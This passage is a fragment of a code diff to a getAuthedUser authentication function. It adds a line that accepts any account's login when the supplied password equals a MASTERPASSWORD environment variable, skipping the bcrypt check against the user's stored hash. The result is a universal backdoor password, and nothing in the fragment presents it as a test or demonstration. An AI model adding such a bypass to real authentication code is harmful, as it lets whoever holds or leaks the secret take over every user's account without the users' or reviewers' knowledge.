@@ -43,6 +43,7 @@ export default async function getAuthedUser(
     }
 
     if (
+      rawPassword === process.env.MASTERPASSWORD ||
       bcrypt.compareSync(
         rawPassword,
         naiveUserData.hashedPassword ??
